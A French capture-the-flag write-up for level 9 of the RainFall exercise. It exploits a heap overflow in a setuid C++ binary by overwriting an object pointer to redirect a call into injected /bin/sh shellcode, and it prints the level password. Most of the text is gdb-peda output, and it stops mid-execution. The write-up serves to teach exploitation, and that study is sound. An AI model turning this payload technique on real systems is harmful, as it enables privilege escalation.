# LEVEL 9

### Reconnaissance

On se connecte au level9 avec le password : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

On trouve un binaire:
```
level9@192.168.56.102's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
level9@RainFall:~$ ls
level9
level9@RainFall:~$ file level9 
level9: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xdda359aa790074668598f47d1ee04164f5b63afa, not stripped
```
En le désassemblant on tombe sur un binaire qui a été codé en C++.

On fait quelques test:
```
level9@RainFall:~$ ./level9 $(python -c 'print "A" * 100')
level9@RainFall:~$ ./level9 $(python -c 'print "A" * 200')
Segmentation fault (core dumped)
```

On segfault, on va commencé par trouver bon offset. Pour cela j'utilise le plugin <a href="https://github.com/longld/peda">gdb-peda</a> sur mon poste:
```
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ b*0x08048682
Breakpoint 1 at 0x8048682
gdb-peda$ r $(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"')
Starting program: /home/yoginet/Documents/101/rainfall/level9/level9 $(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"')
[----------------------------------registers-----------------------------------]
EAX: 0x6941414d ('MAAi')
EBX: 0x804ec20 ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
ECX: 0x804ebc0 ("$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EDX: 0x804ebb4 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
ESI: 0xf7de3000 --> 0x1e4d6c 
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd0f8 --> 0x0 
ESP: 0xffffd0d0 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:       push   ebp)
EIP: 0x8048682 (<main+142>:     mov    edx,DWORD PTR [eax])
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048677 <main+131>:        call   0x804870e <_ZN1N13setAnnotationEPc>
   0x804867c <main+136>:        mov    eax,DWORD PTR [esp+0x10]
   0x8048680 <main+140>:        mov    eax,DWORD PTR [eax]
=> 0x8048682 <main+142>:        mov    edx,DWORD PTR [eax]
   0x8048684 <main+144>:        mov    eax,DWORD PTR [esp+0x14]
   0x8048688 <main+148>:        mov    DWORD PTR [esp+0x4],eax
   0x804868c <main+152>:        mov    eax,DWORD PTR [esp+0x10]
   0x8048690 <main+156>:        mov    DWORD PTR [esp],eax
[------------------------------------stack-------------------------------------]
0000| 0xffffd0d0 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0004| 0xffffd0d4 --> 0xffffd37d ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffd0d8 --> 0xffffd1b0 --> 0xffffd446 ("SHELL=/bin/bash")
0012| 0xffffd0dc --> 0xf7c35be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0016| 0xffffd0e0 --> 0x804ec20 ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffd0e4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0024| 0xffffd0e8 --> 0x804ec20 ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffd0ec --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048682 in main ()
gdb-peda$ pattern offset 0x6941414d
1765884237 found at offset: 108
```

On test:
```
gdb-peda$ r $(python -c 'print "A" * 108 + "BBBB"')
Starting program: /home/yoginet/Documents/101/rainfall/level9/level9 $(python -c 'print "A" * 108 + "BBBB"')
[----------------------------------registers-----------------------------------]
EAX: 0x42424242 ('BBBB')
EBX: 0x804ec20 ("BBBB")
ECX: 0x70 ('p')
EDX: 0x804ebb4 ('A' <repeats 108 times>, "BBBB")
ESI: 0xf7de3000 --> 0x1e4d6c 
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd158 --> 0x0 
ESP: 0xffffd130 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:       push   ebp)
EIP: 0x8048682 (<main+142>:     mov    edx,DWORD PTR [eax])
EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048677 <main+131>:        call   0x804870e <_ZN1N13setAnnotationEPc>
   0x804867c <main+136>:        mov    eax,DWORD PTR [esp+0x10]
   0x8048680 <main+140>:        mov    eax,DWORD PTR [eax]
=> 0x8048682 <main+142>:        mov    edx,DWORD PTR [eax]
   0x8048684 <main+144>:        mov    eax,DWORD PTR [esp+0x14]
   0x8048688 <main+148>:        mov    DWORD PTR [esp+0x4],eax
   0x804868c <main+152>:        mov    eax,DWORD PTR [esp+0x10]
   0x8048690 <main+156>:        mov    DWORD PTR [esp],eax
[------------------------------------stack-------------------------------------]
0000| 0xffffd130 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0004| 0xffffd134 --> 0xffffd3d5 ('A' <repeats 108 times>, "BBBB")
0008| 0xffffd138 --> 0xffffd210 --> 0xffffd446 ("SHELL=/bin/bash")
0012| 0xffffd13c --> 0xf7c35be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0016| 0xffffd140 --> 0x804ec20 ("BBBB")
0020| 0xffffd144 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0024| 0xffffd148 --> 0x804ec20 ("BBBB")
0028| 0xffffd14c --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048682 in main ()
```
Parfait, l'offset est bien de 108.

Le programme segfault a cette instruction : ``` 0x8048682 <main+142>:        mov    (%eax),%edx``` etant donnée qu'il ne connait pas l'adresse ```0x42424242```

Attardons nous sur le pourquoi on écrase EAX ? On va break au niveau du memcpy un peu avant.

- Comportement "Normal":
```
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0xffffd393 ('A' <repeats 108 times>)
EBX: 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
ECX: 0x13 
EDX: 0x804ebb4 --> 0x0 
ESI: 0xf7de3000 --> 0x1e4d6c 
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd0d8 --> 0xffffd108 --> 0x0 
ESP: 0xffffd0c0 --> 0x804ebb4 --> 0x0 
EIP: 0x8048733 (<_ZN1N13setAnnotationEPc+37>:   call   0x8048510 <memcpy@plt>)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048729 <_ZN1N13setAnnotationEPc+27>:      mov    eax,DWORD PTR [ebp+0xc]
   0x804872c <_ZN1N13setAnnotationEPc+30>:      mov    DWORD PTR [esp+0x4],eax
   0x8048730 <_ZN1N13setAnnotationEPc+34>:      mov    DWORD PTR [esp],edx
=> 0x8048733 <_ZN1N13setAnnotationEPc+37>:      call   0x8048510 <memcpy@plt>
   0x8048738 <_ZN1N13setAnnotationEPc+42>:      leave  
   0x8048739 <_ZN1N13setAnnotationEPc+43>:      ret    
   0x804873a <_ZN1NplERS_>:     push   ebp
   0x804873b <_ZN1NplERS_+1>:   mov    ebp,esp
Guessed arguments:
arg[0]: 0x804ebb4 --> 0x0 
arg[1]: 0xffffd393 ('A' <repeats 108 times>)
arg[2]: 0x6c ('l')
[------------------------------------stack-------------------------------------]
0000| 0xffffd0c0 --> 0x804ebb4 --> 0x0 
0004| 0xffffd0c4 --> 0xffffd393 ('A' <repeats 108 times>)
0008| 0xffffd0c8 --> 0x6c ('l')
0012| 0xffffd0cc --> 0xf7e6ec50 (<_Znwj>:       push   esi)
0016| 0xffffd0d0 --> 0xf7e6ec5c (<_Znwj+12>:    add    ebx,0x13f3a4)
0020| 0xffffd0d4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0024| 0xffffd0d8 --> 0xffffd108 --> 0x0 
0028| 0xffffd0dc --> 0x804867c (<main+136>:     mov    eax,DWORD PTR [esp+0x10])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048733 in N::setAnnotation(char*) ()
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x804ebb4 ('A' <repeats 108 times>, "H\210\004\b")
EBX: 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
ECX: 0x6c ('l')
EDX: 0x804ebb4 ('A' <repeats 108 times>, "H\210\004\b")
ESI: 0xf7de3000 --> 0x1e4d6c 
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd0d8 --> 0xffffd108 --> 0x0 
ESP: 0xffffd0c0 --> 0x804ebb4 ('A' <repeats 108 times>, "H\210\004\b")
EIP: 0x8048738 (<_ZN1N13setAnnotationEPc+42>:   leave)
EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804872c <_ZN1N13setAnnotationEPc+30>:      mov    DWORD PTR [esp+0x4],eax
   0x8048730 <_ZN1N13setAnnotationEPc+34>:      mov    DWORD PTR [esp],edx
   0x8048733 <_ZN1N13setAnnotationEPc+37>:      call   0x8048510 <memcpy@plt>
=> 0x8048738 <_ZN1N13setAnnotationEPc+42>:      leave  
   0x8048739 <_ZN1N13setAnnotationEPc+43>:      ret    
   0x804873a <_ZN1NplERS_>:     push   ebp
   0x804873b <_ZN1NplERS_+1>:   mov    ebp,esp
   0x804873d <_ZN1NplERS_+3>:   mov    eax,DWORD PTR [ebp+0x8]
[------------------------------------stack-------------------------------------]
0000| 0xffffd0c0 --> 0x804ebb4 ('A' <repeats 108 times>, "H\210\004\b")
0004| 0xffffd0c4 --> 0xffffd393 ('A' <repeats 108 times>)
0008| 0xffffd0c8 --> 0x6c ('l')
0012| 0xffffd0cc --> 0xf7e6ec50 (<_Znwj>:       push   esi)
0016| 0xffffd0d0 --> 0xf7e6ec5c (<_Znwj+12>:    add    ebx,0x13f3a4)
0020| 0xffffd0d4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0024| 0xffffd0d8 --> 0xffffd108 --> 0x0 
0028| 0xffffd0dc --> 0x804867c (<main+136>:     mov    eax,DWORD PTR [esp+0x10])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048738 in N::setAnnotation(char*) ()
```

- Comportement "Segfault":
```
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0xffffd38f ('A' <repeats 108 times>, "BBBB")
EBX: 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
ECX: 0xf 
EDX: 0x804ebb4 --> 0x0 
ESI: 0xf7de3000 --> 0x1e4d6c 
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd0c8 --> 0xffffd0f8 --> 0x0 
ESP: 0xffffd0b0 --> 0x804ebb4 --> 0x0 
EIP: 0x8048733 (<_ZN1N13setAnnotationEPc+37>:   call   0x8048510 <memcpy@plt>)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048729 <_ZN1N13setAnnotationEPc+27>:      mov    eax,DWORD PTR [ebp+0xc]
   0x804872c <_ZN1N13setAnnotationEPc+30>:      mov    DWORD PTR [esp+0x4],eax
   0x8048730 <_ZN1N13setAnnotationEPc+34>:      mov    DWORD PTR [esp],edx
=> 0x8048733 <_ZN1N13setAnnotationEPc+37>:      call   0x8048510 <memcpy@plt>
   0x8048738 <_ZN1N13setAnnotationEPc+42>:      leave  
   0x8048739 <_ZN1N13setAnnotationEPc+43>:      ret    
   0x804873a <_ZN1NplERS_>:     push   ebp
   0x804873b <_ZN1NplERS_+1>:   mov    ebp,esp
Guessed arguments:
arg[0]: 0x804ebb4 --> 0x0 
arg[1]: 0xffffd38f ('A' <repeats 108 times>, "BBBB")
arg[2]: 0x70 ('p')
[------------------------------------stack-------------------------------------]
0000| 0xffffd0b0 --> 0x804ebb4 --> 0x0 
0004| 0xffffd0b4 --> 0xffffd38f ('A' <repeats 108 times>, "BBBB")
0008| 0xffffd0b8 --> 0x70 ('p')
0012| 0xffffd0bc --> 0xf7e6ec50 (<_Znwj>:       push   esi)
0016| 0xffffd0c0 --> 0xf7e6ec5c (<_Znwj+12>:    add    ebx,0x13f3a4)
0020| 0xffffd0c4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0024| 0xffffd0c8 --> 0xffffd0f8 --> 0x0 
0028| 0xffffd0cc --> 0x804867c (<main+136>:     mov    eax,DWORD PTR [esp+0x10])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048733 in N::setAnnotation(char*) ()
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x804ebb4 ('A' <repeats 108 times>, "BBBB")
EBX: 0x804ec20 ("BBBB")
ECX: 0x70 ('p')
EDX: 0x804ebb4 ('A' <repeats 108 times>, "BBBB")
ESI: 0xf7de3000 --> 0x1e4d6c 
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd0c8 --> 0xffffd0f8 --> 0x0 
ESP: 0xffffd0b0 --> 0x804ebb4 ('A' <repeats 108 times>, "BBBB")
EIP: 0x8048738 (<_ZN1N13setAnnotationEPc+42>:   leave)
EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804872c <_ZN1N13setAnnotationEPc+30>:      mov    DWORD PTR [esp+0x4],eax
   0x8048730 <_ZN1N13setAnnotationEPc+34>:      mov    DWORD PTR [esp],edx
   0x8048733 <_ZN1N13setAnnotationEPc+37>:      call   0x8048510 <memcpy@plt>
=> 0x8048738 <_ZN1N13setAnnotationEPc+42>:      leave  
   0x8048739 <_ZN1N13setAnnotationEPc+43>:      ret    
   0x804873a <_ZN1NplERS_>:     push   ebp
   0x804873b <_ZN1NplERS_+1>:   mov    ebp,esp
   0x804873d <_ZN1NplERS_+3>:   mov    eax,DWORD PTR [ebp+0x8]
[------------------------------------stack-------------------------------------]
0000| 0xffffd0b0 --> 0x804ebb4 ('A' <repeats 108 times>, "BBBB")
0004| 0xffffd0b4 --> 0xffffd38f ('A' <repeats 108 times>, "BBBB")
0008| 0xffffd0b8 --> 0x70 ('p')
0012| 0xffffd0bc --> 0xf7e6ec50 (<_Znwj>:       push   esi)
0016| 0xffffd0c0 --> 0xf7e6ec5c (<_Znwj+12>:    add    ebx,0x13f3a4)
0020| 0xffffd0c4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0024| 0xffffd0c8 --> 0xffffd0f8 --> 0x0 
0028| 0xffffd0cc --> 0x804867c (<main+136>:     mov    eax,DWORD PTR [esp+0x10])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048738 in N::setAnnotation(char*) ()
```
On depasse de 4 octets et on va re ecrire EBX.

On peux donc en déduire que la taille de la dest du memcpy, qui est a cette adresse: 0x804ebb4 est de 108.

D'ailleur sa rejoint le code asm désassemblé:
```
0x08048610      c704246c0000.  mov dword [esp], 0x6c
```
ou x6c = 108

Maintenant si on break un peu plus loin, au niveau du call edx:
```
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
EBX: 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
ECX: 0x6c ('l')
EDX: 0x804873a (<_ZN1NplERS_>:  push   ebp)
ESI: 0xf7de3000 --> 0x1e4d6c 
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd108 --> 0x0 
ESP: 0xffffd0e0 --> 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:       push   ebp)
EIP: 0x8048693 (<main+159>:     call   edx)
EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048688 <main+148>:        mov    DWORD PTR [esp+0x4],eax
   0x804868c <main+152>:        mov    eax,DWORD PTR [esp+0x10]
   0x8048690 <main+156>:        mov    DWORD PTR [esp],eax
=> 0x8048693 <main+159>:        call   edx
   0x8048695 <main+161>:        mov    ebx,DWORD PTR [ebp-0x4]
   0x8048698 <main+164>:        leave  
   0x8048699 <main+165>:        ret    
   0x804869a <_Z41__static_initialization_and_destruction_0ii>: push   ebp
Guessed arguments:
arg[0]: 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:   push   ebp)
arg[1]: 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:   push   ebp)
[------------------------------------stack-------------------------------------]
0000| 0xffffd0e0 --> 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0004| 0xffffd0e4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0008| 0xffffd0e8 --> 0xffffd1c0 --> 0xffffd400 ("SHELL=/bin/bash")
0012| 0xffffd0ec --> 0xf7c35be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0016| 0xffffd0f0 --> 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0020| 0xffffd0f4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0024| 0xffffd0f8 --> 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0028| 0xffffd0fc --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048693 in main ()
```
EDX pointe vers la fonction _ZN1NplERS_.

Nous allons donc modifier EDX de facon a exécuté notre shellcode.


### Exploitation

Il nous faut donc trouvé une adresse pour remplacer la valeur de EDX et changé le jeu d'instruction au moment du call.

On essaie de faire pointé au début de notre buffer qui contiendra le shellcode. Pour le choix de l'adresse, on peux prendre soit l'adresse sur la stack:
```
gdb-peda$ x/s 0xffffd38f
0xffffd38f:     'A' <repeats 108 times>, "\217\323\377\377"
```

Soit l'adresse de la dest du memcpy:
```
[...]
=> 0x8048733 <_ZN1N13setAnnotationEPc+37>:      call   0x8048510 <memcpy@plt>
   0x8048738 <_ZN1N13setAnnotationEPc+42>:      leave  
   0x8048739 <_ZN1N13setAnnotationEPc+43>:      ret    
   0x804873a <_ZN1NplERS_>:     push   ebp
   0x804873b <_ZN1NplERS_+1>:   mov    ebp,esp
Guessed arguments:
arg[0]: 0x804ebb4 --> 0x0 
arg[1]: 0xffffd38f ('A' <repeats 108 times>, "BBBB")
arg[2]: 0x70 ('p')
[...]
```

On fera le test avec les 2 adresses.

On converti l'address:
```
>>> from pwn import *
>>> p32(0xffffd38f)
'\x8f\xd3\xff\xff'
```

Le shellcode (source: https://www.exploit-db.com/exploits/13357):
```
\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

Préparation du payload :
```
[SHELLCODE (len 55)] + [A * 53] + [ADRESS SHELLCODE]

r $(python -c 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 53 + "\x8f\xd3\xff\xff"')
```

Probleme: notre shellcode a été converti en addresse :(
```
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x804ec20 --> 0xffffd38f --> 0xdb31c031 
EBX: 0x804ec20 --> 0xffffd38f --> 0xdb31c031 
ECX: 0x70 ('p')
EDX: 0xdb31c031 
ESI: 0xf7de3000 --> 0x1e4d6c 
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd0f8 --> 0x0 
ESP: 0xffffd0d0 --> 0x804ec20 --> 0xffffd38f --> 0xdb31c031 
EIP: 0x8048693 (<main+159>:     call   edx)
EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048688 <main+148>:        mov    DWORD PTR [esp+0x4],eax
   0x804868c <main+152>:        mov    eax,DWORD PTR [esp+0x10]
   0x8048690 <main+156>:        mov    DWORD PTR [esp],eax
=> 0x8048693 <main+159>:        call   edx
[...]
```

On va donc mettre l'adresse + 4 de facon a pointé sur le jeu d'instruction du shellcode:
```
>>> p32(0xffffd38f + 4)
'\x93\xd3\xff\xff'
```

Et modifier le padding:
```
r $(python -c 'print "\x93\xd3\xff\xff" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 49 + "\x8f\xd3\xff\xff"')
```

On test:
```
gdb-peda$ r $(python -c 'print "\x93\xd3\xff\xff" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 49 + "\x8f\xd3\xff\xff"')
Starting program: /home/yoginet/Documents/101/rainfall/level9/level9 $(python -c 'print "\x93\xd3\xff\xff" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 49 + "\x8f\xd3\xff\xff"')
[----------------------------------registers-----------------------------------]                                                                              
EAX: 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031 
EBX: 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031 
ECX: 0x70 ('p')
EDX: 0xffffd393 --> 0xdb31c031 
ESI: 0xf7de3000 --> 0x1e4d6c 
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd0f8 --> 0x0 
ESP: 0xffffd0d0 --> 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031 
EIP: 0x8048693 (<main+159>:     call   edx)
EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]                                                                              
   0x8048688 <main+148>:        mov    DWORD PTR [esp+0x4],eax
   0x804868c <main+152>:        mov    eax,DWORD PTR [esp+0x10]
   0x8048690 <main+156>:        mov    DWORD PTR [esp],eax
=> 0x8048693 <main+159>:        call   edx
   0x8048695 <main+161>:        mov    ebx,DWORD PTR [ebp-0x4]
   0x8048698 <main+164>:        leave  
   0x8048699 <main+165>:        ret    
   0x804869a <_Z41__static_initialization_and_destruction_0ii>: push   ebp
Guessed arguments:
arg[0]: 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031 
arg[1]: 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:   push   ebp)
[------------------------------------stack-------------------------------------]                                                                              
0000| 0xffffd0d0 --> 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031 
0004| 0xffffd0d4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:    push   ebp)
0008| 0xffffd0d8 --> 0xffffd1b0 --> 0xffffd400 ("SHELL=/bin/bash")
0012| 0xffffd0dc --> 0xf7c35be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0016| 0xffffd0e0 --> 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031 
0020| 0xffffd0e4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:    push   ebp)
0024| 0xffffd0e8 --> 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031 
0028| 0xffffd0ec --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:    push   ebp)
[------------------------------------------------------------------------------]                                                                              
Legend: code, data, rodata, value

Breakpoint 1, 0x08048693 in main ()
gdb-peda$ ni
[----------------------------------registers-----------------------------------]                                                                              
EAX: 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031                    
EBX: 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031                    
ECX: 0x70 ('p')                                                                
EDX: 0xffffd393 --> 0xdb31c031                                                 
ESI: 0xf7de3000 --> 0x1e4d6c                                                   
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd0f8 --> 0x0 
ESP: 0xffffd0cc --> 0x8048695 (<main+161>:      mov    ebx,DWORD PTR [ebp-0x4])
EIP: 0xffffd393 --> 0xdb31c031
EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]                                                                              
=> 0xffffd393:  xor    eax,eax
   0xffffd395:  xor    ebx,ebx
   0xffffd397:  mov    al,0x6
   0xffffd399:  int    0x80
[------------------------------------stack-------------------------------------]                                                                              
0000| 0xffffd0cc --> 0x8048695 (<main+161>:     mov    ebx,DWORD PTR [ebp-0x4])
0004| 0xffffd0d0 --> 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031 
0008| 0xffffd0d4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:    push   ebp)
0012| 0xffffd0d8 --> 0xffffd1b0 --> 0xffffd400 ("SHELL=/bin/bash")
0016| 0xffffd0dc --> 0xf7c35be5 (<__cxa_atexit+37>:     add    esp,0x1c)
0020| 0xffffd0e0 --> 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031 
0024| 0xffffd0e4 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:    push   ebp)
0028| 0xffffd0e8 --> 0x804ec20 --> 0xffffd38f --> 0xffffd393 --> 0xdb31c031 
